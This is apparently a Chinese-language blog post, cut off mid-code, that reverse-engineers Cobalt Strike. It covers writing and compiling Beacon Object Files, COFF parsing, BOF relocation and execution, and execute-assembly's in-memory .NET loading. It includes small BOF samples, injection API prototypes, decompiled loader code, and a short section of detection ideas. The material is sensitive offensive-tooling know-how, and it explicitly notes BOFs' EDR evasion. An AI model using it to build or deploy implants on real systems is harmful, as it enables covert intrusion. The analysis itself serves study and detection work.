    <content type="html"><![CDATA[<ul><li>本文首发于跳跳糖安全社区<a href="https://tttang.com/archive/1786/" target="_blank" rel="external">https://tttang.com/archive/1786/</a></li></ul><a id="more"></a><h2 id="0x01-Beacon-Object-File"><a href="#0x01-Beacon-Object-File" class="headerlink" title="0x01 Beacon Object File"></a>0x01 Beacon Object File</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BOF(Beacon 对象文件)是C/C++编译，但未链接产生的Obj文件，BOF运行在Beacon进程中，并执行内部的Beacon API和Win32 API函数。BOF本质是COFF Obj文件，其符合COFF文件格式规范，结构类似于windows PE文件格式。在被Cobalt Strike加载和使用过程中，BOF是一段地址无关的Shellcode，BOF本身体积比较小，在传输过程中，适用于那些传输带宽小的模式，然后其本身运行在beacon进程内部，不会重新创建进程，也可以有效规避EDR。</p><h2 id="0x02-如何开发BOF"><a href="#0x02-如何开发BOF" class="headerlink" title="0x02 如何开发BOF"></a>0x02 如何开发BOF</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;下面是官方提供的一个demo<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">/<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></div><div class="line">/<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"beacon.h"</span></span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">go</span><span class="params">(<span class="keyword">char</span> * args, <span class="keyword">int</span> alen)</span> </span>&#123;</div><div class="line">BeaconPrintf(CALLBACK_OUTPUT, <span class="string">"Hello World: %s"</span>, args);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以使用Visual Studio或者MinGW进行编译,最后生成.obj文件。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">cl<span class="selector-class">.exe</span> /c /GS- hello<span class="selector-class">.c</span> /Fo hello.obj</div><div class="line">i686-w64-mingw32-gcc -c hello<span class="selector-class">.c</span> -o hello.o</div><div class="line">x86_64-w64-mingw32-gcc -c hello<span class="selector-class">.c</span> -o hello.o</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在cl.exe生成obj文件的时候，可能遇到<code>fatal error C1034: stdio.h: 不包括路径集</code>问题，产生这个的原因是没有设置对应的INCLUDE和LIB环境变量。而且不能仅仅设置Vs的Include的路径，还要设置SDK的路径。具体如下：<a href="https://blog.csdn.net/weixin_41115751/article/details/89817123" target="_blank" rel="external">https://blog.csdn.net/weixin_41115751/article/details/89817123</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在生成.obj之后，使用inline-execute + obj_path 执行obj文件</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BOF内部自带4种API，<code>数据解析API</code>，主要解析Aggressor Script 使用bof_pack函数打包的参数。<code>打印输出API</code>，主要起到打印输出的作用。格式化API，以及内部API。内部API主要包含一些令牌句柄的使用，以及进程注入相关的API。具体细节可以参考<a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_main.htm" target="_blank" rel="external">官方的Bof文档</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;数据解析API主要包含：</p><ul><li>char <em> BeaconDataExtract (datap </em> parser, int * size)</li><li>int BeaconDataInt (datap * parser)</li><li>int BeaconDataLength (datap * parser)</li><li>void BeaconDataParse (datap <em> parser, char </em> buffer, int size)</li><li>short BeaconDataShort (datap * parser)</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在beacon.h中可以看到这些API原型。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* Token Functions */</span></div><div class="line"><span class="function">DECLSPEC_IMPORT BOOL   <span class="title">BeaconUseToken</span><span class="params">(HANDLE token)</span></span>;</div><div class="line"><span class="function">DECLSPEC_IMPORT <span class="keyword">void</span>   <span class="title">BeaconRevertToken</span><span class="params">()</span></span>;</div><div class="line"><span class="function">DECLSPEC_IMPORT BOOL   <span class="title">BeaconIsAdmin</span><span class="params">()</span></span>;</div><div class="line"></div><div class="line"><span class="comment">/* Spawn+Inject Functions */</span></div><div class="line"><span class="function">DECLSPEC_IMPORT <span class="keyword">void</span>   <span class="title">BeaconGetSpawnTo</span><span class="params">(BOOL x86, <span class="keyword">char</span> * buffer, <span class="keyword">int</span> length)</span></span>;</div><div class="line"><span class="function">DECLSPEC_IMPORT <span class="keyword">void</span>   <span class="title">BeaconInjectProcess</span><span class="params">(HANDLE hProc, <span class="keyword">int</span> pid, <span class="keyword">char</span> * payload, <span class="keyword">int</span> p_len, <span class="keyword">int</span> p_offset, <span class="keyword">char</span> * arg, <span class="keyword">int</span> a_len)</span></span>;</div><div class="line"><span class="function">DECLSPEC_IMPORT <span class="keyword">void</span>   <span class="title">BeaconInjectTemporaryProcess</span><span class="params">(PROCESS_INFORMATION * pInfo, <span class="keyword">char</span> * payload, <span class="keyword">int</span> p_len, <span class="keyword">int</span> p_offset, <span class="keyword">char</span> * arg, <span class="keyword">int</span> a_len)</span></span>;</div><div class="line"><span class="function">DECLSPEC_IMPORT BOOL   <span class="title">BeaconSpawnTemporaryProcess</span><span class="params">(BOOL x86, BOOL ignoreToken, STARTUPINFO * si, PROCESS_INFORMATION * pInfo)</span></span>;</div><div class="line"><span class="function">DECLSPEC_IMPORT <span class="keyword">void</span>   <span class="title">BeaconCleanupProcess</span><span class="params">(PROCESS_INFORMATION * pInfo)</span></span>;</div><div class="line"></div><div class="line"><span class="comment">/* Utility Functions */</span></div><div class="line"><span class="function">DECLSPEC_IMPORT BOOL   <span class="title">toWideChar</span><span class="params">(<span class="keyword">char</span> * src, <span class="keyword">wchar_t</span> * dst, <span class="keyword">int</span> max)</span></span>;</div></pre></td></tr></table></figure></p><h2 id="0x03-动态函数解析-DFR"><a href="#0x03-动态函数解析-DFR" class="headerlink" title="0x03 动态函数解析(DFR)"></a>0x03 动态函数解析(DFR)</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;动态函数解析，即Dynamic Function Resolution (DFR)</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以下demo的功能是查找当前域，需要使用两个API函数DsGetDcNameA,NetApiBufferFree都是由NETAPI32模块进行导出。</p><ul><li>DECLSPEC_IMPORT：导入函数的关键字</li><li>WINAPI：函数调用约定，一般API函数都是这个</li><li>NETAPI32：函数所在的模块名</li><li>DsGetDcNameA/NetApiBufferFree：函数名称</li></ul><figure class="highlight autoit"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">/<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span> </span></div><div class="line">/<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span> </span></div><div class="line">/<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dsgetdc.h&gt;</span> </span></div><div class="line">/<span class="meta">#<span class="meta-keyword">include</span> <span class="string">"beacon.h"</span> </span></div><div class="line">DECLSPEC_IMPORT DWORD WINAPI NETAPI32$DsGetDcNameA(LPVOID, LPVOID, LPVOID, LPVOID, ULONG, LPVOID)<span class="comment">; </span></div><div class="line">DECLSPEC_IMPORT DWORD WINAPI NETAPI32$NetApiBufferFree(LPVOID)<span class="comment">; </span></div><div class="line">void go(char * args, <span class="built_in">int</span> alen) &#123; </div><div class="line">DWORD dwRet<span class="comment">; </span></div><div class="line">PDOMAIN_CONTROLLER_INFO pdcInfo；</div><div class="line">dwRet = NETAPI32$DsGetDcNameA(<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;pdcInfo)<span class="comment">; </span></div><div class="line"><span class="keyword">if</span> (ERROR_SUCCESS == dwRet) &#123; </div><div class="line">BeaconPrintf(CALLBACK_OUTPUT, <span class="string">"%s"</span>, pdcInfo-&gt;DomainName)<span class="comment">; </span></div><div class="line">&#125; </div><div class="line">NETAPI32$NetApiBufferFree(pdcInfo)<span class="comment">; </span></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以使用<a href="https://github.com/dtmsecurity/bof_helper" target="_blank" rel="external">bof_help</a>这个工具自动修改符合BOF格式的函数原型。但目前来说可能不是很好用了。参考自<a href="https://idiotc4t.com/weaponization/bof-weaponization" target="_blank" rel="external">https://idiotc4t.com/weaponization/bof-weaponization</a></p><h2 id="0x04-Obj文件解析"><a href="#0x04-Obj文件解析" class="headerlink" title="0x04 Obj文件解析"></a>0x04 Obj文件解析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OBj文件的文件类型是COFF Object，使用<code>dumpbin /all obj_path</code>解析Obj文件格式。Obj文件首先是_IMAGE_FILE_HEADER，保存着整个文件基本信息，然后依次保存着每个节区的<code>SECTION HEADER</code>和节区内容。然后接着就是重定位表，符号表。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文件头格式如下：<br><figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">typedef struct _IMAGE_FILE_HEADER &#123;</div><div class="line">    <span class="type">WORD</span>    <span class="type">Machine</span>;</div><div class="line">    <span class="type">WORD</span>    <span class="type">NumberOfSections</span>;</div><div class="line">    <span class="type">DWORD</span>   <span class="type">TimeDateStamp</span>;</div><div class="line">    <span class="type">DWORD</span>   <span class="type">PointerToSymbolTable</span>;</div><div class="line">    <span class="type">DWORD</span>   <span class="type">NumberOfSymbols</span>;</div><div class="line">    <span class="type">WORD</span>    <span class="type">SizeOfOptionalHeader</span>;</div><div class="line">    <span class="type">WORD</span>    <span class="type">Characteristics</span>;</div><div class="line">&#125; <span class="type">IMAGE_FILE_HEADER</span>, *<span class="type">PIMAGE_FILE_HEADER</span>;</div></pre></td></tr></table></figure></p><ul><li>Machine为0x14c，表示这是一个x86的Obj</li><li>NumberOfSections为4，说明有4个Section</li><li>TimeDateStamp是时间戳</li><li>PointerToSymbolTable;指向符号表</li><li>NumberOfSymbols：符号个数<figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">FILE HEADER VALUES</div><div class="line">             <span class="number">14</span>C machine (x86)</div><div class="line">               <span class="number">4</span> <span class="built_in">number</span> <span class="keyword">of</span> sections</div><div class="line">        <span class="number">63</span>*E60*D <span class="built_in">time</span> <span class="built_in">date</span> stamp Thu ***  <span class="number">6</span> <span class="number">13</span>:*:<span class="number">29</span> <span class="number">20</span>**</div><div class="line">             <span class="number">1E6</span> <span class="built_in">file</span> pointer <span class="keyword">to</span> symbol table</div><div class="line">               D <span class="built_in">number</span> <span class="keyword">of</span> symbols</div><div class="line">               <span class="number">0</span> size <span class="keyword">of</span> optional header</div><div class="line">               <span class="number">0</span> characteristics</div></pre></td></tr></table></figure></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;节区头的结构体如下：<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">typedef struct _IMAGE_SECTION_HEADER &#123;</div><div class="line">    <span class="keyword">BYTE </span>   Name[IMAGE_SIZEOF_SHORT_NAME]<span class="comment">;</span></div><div class="line">    union &#123;</div><div class="line">            DWORD   PhysicalAddress<span class="comment">;</span></div><div class="line">            DWORD   VirtualSize<span class="comment">;</span></div><div class="line">    &#125; Misc<span class="comment">;</span></div><div class="line">    DWORD   VirtualAddress<span class="comment">;</span></div><div class="line">    DWORD   SizeOfRawData<span class="comment">;</span></div><div class="line">    DWORD   PointerToRawData<span class="comment">;</span></div><div class="line">    DWORD   PointerToRelocations<span class="comment">;</span></div><div class="line">    DWORD   PointerToLinenumbers<span class="comment">;</span></div><div class="line">    WORD    NumberOfRelocations<span class="comment">;</span></div><div class="line">    WORD    NumberOfLinenumbers<span class="comment">;</span></div><div class="line">    DWORD   Characteristics<span class="comment">;</span></div><div class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER<span class="comment">;</span></div></pre></td></tr></table></figure></p><ul><li>Name:表示节区的名字</li><li>SizeOfRawData：表示节区数据的大小</li><li>PointerToRawData：表示节区数据的偏移或者指针。<br>  <img src="http://hacky.wang/blog/20221006/mDIFeQ5nddDi.png?imageslim" alt="mark"></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;text段<br>    <img src="http://hacky.wang/blog/20221006/MptBSPCSbpal.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;重定位表<br>    <img src="http://hacky.wang/blog/20221006/w8Esfhuxpqen.png?imageslim" alt="mark"></p><h2 id="0x05-服务端BOF实现原理"><a href="#0x05-服务端BOF实现原理" class="headerlink" title="0x05 服务端BOF实现原理"></a>0x05 服务端BOF实现原理</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先是如何定位入口点，如果熟悉Cobalt Strike伪源码的，应该知道Cobalt Strike的命令分发执行位于BeaconConsole.java的<code>public void actionPerformed(ActionEvent var1)</code>函数，如果不熟悉Cobalt Strike伪源码呢，使用notepad++的文件夹搜索功能，搜索<code>inline-execute</code>也可以定位到<code>public void actionPerformed(ActionEvent var1)</code>函数。<br>    <img src="http://hacky.wang/blog/20220620/vekIhsaPBo9u.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;显然，可以看见，当执行<code>inline-execute</code>命令时，首先会将命令中的objectfile的路径解析出来，然后作为参数传入<code>InlineExecuteObject</code>函数。<br>    <img src="http://hacky.wang/blog/20220620/pUGP2rSrapKT.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>InlineExecuteObject</code>函数中，首先，调用DataUtils.getBeacon获取Beacon的各种信息，这里使用到的是CPU架构。然后传入<code>this.InlineExecuteObject</code>函数中。最终调用go()这个函数。<br>    <img src="http://hacky.wang/blog/20220620/n4LkdTY9m5vR.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在go这个函数中，依次获取架构，是x64还是x86，并判断Obj的架构和beacon的架构是否一致，一致才可以继续<br>    <img src="http://hacky.wang/blog/20220620/nArcas0kygdP.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后读取Object文件，分别解析Code段，RData段，Data段，和Relocations段，复制这些段的数据，复制原理如下，首先，通过解析Header中的数据，可以获取各个段的起始地址和大小，这样就可以获取各个段的范围，然后就可以获取指定段的内容。<br>    <img src="http://hacky.wang/blog/20220620/bAOTHyCmqais.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220620/qG4GLthj00qY.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>getRelocations()</code>函数中，会根据不同的段，插入不同的Magic Number。例如，如果是.rdata，则会插入1024，如果是.data，则会插入1025，如果是.text，则会插入1026，如果是DynamicFunction，则会插入1027，最后以插入1028结尾。<br>    <img src="http://hacky.wang/blog/20220620/W4shAFvgNzou.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;同时，可以看到插入数据的结构，首先是插入的Type(类型)，然后插入一个Magic Number,第三是插入偏移，最后插入在段中的偏移。有个例外，针对DynamicFunction这块的处理可能需要插入其他的数据。<br>    <img src="http://hacky.wang/blog/20220620/JI701R83bkMS.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着是构造命令，依次添加命令号，添加obj的入口点，添加code，添加Rdata，添加data，添加Relocations，和Arguments，这个Arguments没理解是什么东西。<br>    <img src="http://hacky.wang/blog/20220620/7cJRR5CvXTdj.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220620/S7APY2D3K5Al.png?imageslim" alt="mark"></p><h2 id="0x06-beacon端调用原理分析"><a href="#0x06-beacon端调用原理分析" class="headerlink" title="0x06 beacon端调用原理分析"></a>0x06 beacon端调用原理分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;beacon分为loader和payload，loader可以自行开发，payload采用反射注入的方式进行加载，默认情况下，导出表有两个函数，一个是<code>ReflectiveLoader</code>另外一个是<code>DllEntryPoint</code>。在执行payload的时候，优先执行ReflectiveLoader，在处理完PE数据后，跳转到<code>DllEntryPoint</code>函数，然后根据dll加载的原因选择进行数据的初始化，还是进行工作。<br>    <img src="http://hacky.wang/blog/20220621/dSnpaJImNvt7.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在4.1的Cobalt Strike生成的beacon中，大概在这个地方(Sub_336560_CommandDisPatch)进行命令操作。<br>    <img src="http://hacky.wang/blog/20220621/exGqnQP1GMpi.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这是服务端传来的原始数据，显然，前四个字节正好是100，为命令号，和cobaltstrike发送命令数据的结构一致。<br>    <img src="http://hacky.wang/blog/20220621/WBk5efP42kHE.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220621/ObjoluTJl3MY.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在函数<code>Sub_336560_CommandDisPatch</code>中，显然可以看到，首先解析出命令号，然后将除了命令号以外的数据作为第二个参数传入，将结果作为第三个参数传入，用以获取执行的结果。<br>    <img src="http://hacky.wang/blog/20220621/wJHauWaHdJli.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据命令号，选择不同需要执行的函数，此处将该函数命名为<code>Sub_32D020_inline_execute</code>,在<code>Sub_32D020_inline_execute</code>中，首先依次解析Code段，RData段，Data段，Relocations段，和Arguments。<br>    <img src="http://hacky.wang/blog/20220621/9WaE6eHifaRK.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;随后，便开始解析Relocations段，cobaltstrike通过不同的硬编码数据将不同的数据类型进行分割，0x400表示.rdata段，0x401表示.data段，0x402表示.text段，0x403表示DynamicFunction，0x404则表示结束。<br>    <img src="http://hacky.wang/blog/20220621/KnJymTWvmyj9.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>Sub_32D4F4_WriteOffset</code>函数的目的是修改代码段中的一些常量或者DynamicFunction的地址，因为在汇编层级，这些地址都是偏移量，所以需要计算偏移量并写入代码中，才能实现调用。<br>    <img src="http://hacky.wang/blog/20220621/2nH6quhrrMif.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220621/WxNuQYEu6DnF.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后执行shellcode<br>    <img src="http://hacky.wang/blog/20220621/up02oD67Upiy.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以下是传入的数据。显然，第一行是命令号和EntryPoint，然后下面是code段和rdata段，再下面是Relocations段。<br>    <img src="http://hacky.wang/blog/20220621/T8PSHxAlkHVT.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220621/noddhlG1332V.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后在对比一下原始的code段，和需要执行的shellcode的区别，很显然，关于常量的偏移地址是不同的。也就是说此处做了重定位。<br>    <img src="http://hacky.wang/blog/20220621/P4VHTIPSQbHE.png?imageslim" alt="mark"></p><h2 id="0x07-检测思路"><a href="#0x07-检测思路" class="headerlink" title="0x07 检测思路"></a>0x07 检测思路</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;常规的工具(BeaconEye)可能没有什么好的检测思路，我之前设想过，通过beaconEye有没有可能检测BOF，但是后来仔细想了一下发现不行，因为BeaconEye通过检测内存中的特征码实现的，但是BOF在调用执行完shellcode的时候就被释放了，可能无法检测。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从流量角度看，传入的流量数据，起始的命令号(100)以及getRelocations中的Magic Number是否可以作为检测依据？</p><h2 id="0x08-execuate-assembly"><a href="#0x08-execuate-assembly" class="headerlink" title="0x08 execuate-assembly"></a>0x08 execuate-assembly</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在CobaltStrike3中，新增了名为<code>execuate-assembly</code>命令，该命令本质是实现了在内存中加载.Net程序集。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;执行<code>execute-assembly</code>命令之后，判断是否存在参数，如果存在参数，得到CSharp程序路径和参数，分别传入ExecuteAssembly，如果不存在参数，只需要传入CSharp程序路径。<br>    <img src="http://hacky.wang/blog/20221008/K1EkkcUr1ty5.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>ExecuteAssembly</code>函数中，首先读取Charp程序，并判断其是否是一个.NET程序，然后根据Beacon判断是否是64位系统，如果是X64的话，则会加载X64的装载程序初始化CRL环境并加载.NET程序<br>    <img src="http://hacky.wang/blog/20221008/JkLeI6gSyarK.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;读取<code>resources/invokeassembly.dll</code>文件，该程序的作用是初始化CLR以及加载.Net程序集，然后将<code>invokeassembly.dll</code>,<code>CSharp程序</code>，以及一些配置信息一起发送给beacon。<br>    <img src="http://hacky.wang/blog/20221008/kVUxJSQWSpiv.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;beacon.exe，第70号命令即为<code>execte-assembly</code>,其逻辑也很简单，在解析玩配置信息之后，拉起一个Rundll32进程，然后将invokeassembly.dll注入进去，invokeassembly.dll就会在rundll32中初始化环境并加载程序集了。<br>    <img src="http://hacky.wang/blog/20221008/mHYYLhIpySQN.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;转储了invokeassembly.dll，拖到IDA中，发现其和beacon一样采用了反射注入的方式。直接定位到关键函数。<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div></pre></td><td class="code"><pre><div class="line">__int64 __fastcall sub_180001470(__int64 a1,<span class="built_in"> const </span>void *a2, unsigned<span class="built_in"> int </span>a3)</div><div class="line">&#123;</div><div class="line">[.....]</div><div class="line">  v6 = GetStdHandle(0xFFFFFFF5);</div><div class="line">  SetStdHandle(0xFFFFFFF4, v6);</div><div class="line"> <span class="built_in"> if </span>( !sub_180001294(&amp;v16) )</div><div class="line">  &#123;</div><div class="line">    result = Sub_1800022B8_Output(<span class="string">"[-] Failed to create the runtime host\n"</span>, v7);</div><div class="line">   <span class="built_in"> goto </span><span class="class">LABEL_27;</span></div><div class="line">  &#125;</div><div class="line">  v9 = (*(*v16 + 80i64))(v16);</div><div class="line"> <span class="built_in"> if </span>( v9 &lt; 0 )</div><div class="line">  &#123;</div><div class="line">    v10 = <span class="string">"[-] CLR failed to start w/hr 0x%08lx\n"</span>;</div><div class="line">LABEL_5:</div><div class="line">    result = Sub_1800022B8_Output(v10, v9);</div><div class="line">   <span class="built_in"> goto </span><span class="class">LABEL_27;</span></div><div class="line">  &#125;</div><div class="line"> <span class="built_in"> if </span>( v18 )</div><div class="line">    ((*v18)[2])(v18);</div><div class="line">  v18 = 0i64;</div><div class="line">  v9 = (*(*v16 + 104i64))(v16, &amp;v18);</div><div class="line"> <span class="built_in"> if </span>( v9 &lt; 0 )</div><div class="line">  &#123;</div><div class="line">    v10 = <span class="string">"[-] ICorRuntimeHost::GetDefaultDomain failed w/hr 0x%08lx\n"</span>;</div><div class="line">   <span class="built_in"> goto </span><span class="class">LABEL_5;</span></div><div class="line">  &#125;</div><div class="line">  v11 = v18;</div><div class="line"> <span class="built_in"> if </span>( !v18 )</div><div class="line">  &#123;</div><div class="line">    sub_180001DA0(0x80004003i64);</div><div class="line">    __debugbreak();</div><div class="line">  &#125;</div><div class="line"> <span class="built_in"> if </span>( v22 )</div><div class="line">    (*(*v22 + 16i64))(v22);</div><div class="line">  v22 = 0i64;</div><div class="line">  v12 = *v11;</div><div class="line">  v13 = sub_180001000(&amp;v22);</div><div class="line">  v9 = (*v12)(v11, &amp;unk_180010510, v13);</div><div class="line"> <span class="built_in"> if </span>( v9 &lt; 0 )</div><div class="line">  &#123;</div><div class="line">    v10 = <span class="string">"[-] Failed to get default AppDomain w/hr 0x%08lx\n"</span>;</div><div class="line">   <span class="built_in"> goto </span><span class="class">LABEL_5;</span></div><div class="line">  &#125;</div><div class="line">  rgsabound.cElements = v3;</div><div class="line">  rgsabound.l<span class="class">Lbound = 0;</span></div><div class="line">  v14 = SafeArrayCreate(0x11u, 1u, &amp;rgsabound);</div><div class="line">  SafeArrayLock(v14);</div><div class="line">  memmove(v14-&gt;pvData, a2, v3);</div><div class="line">  SafeArrayUnlock(v14);</div><div class="line">[.....]</div><div class="line"> <span class="built_in"> if </span>( v17 )</div><div class="line">    (*(*v17 + 16i64))(v17);</div><div class="line">  v17 = 0i64;</div><div class="line">  v9 = (*(*v15 + 360i64))(v15, v14, &amp;v17);</div><div class="line"> <span class="built_in"> if </span>( v9 &lt; 0 )</div><div class="line">  &#123;</div><div class="line">    v10 = <span class="string">"[-] Failed to load the assembly w/hr 0x%08lx\n"</span>;</div><div class="line">   <span class="built_in"> goto </span><span class="class">LABEL_5;</span></div><div class="line">  &#125;</div><div class="line">  v20 = v17;</div><div class="line"> <span class="built_in"> if </span>( v17 )</div><div class="line">    (*(*v17 + 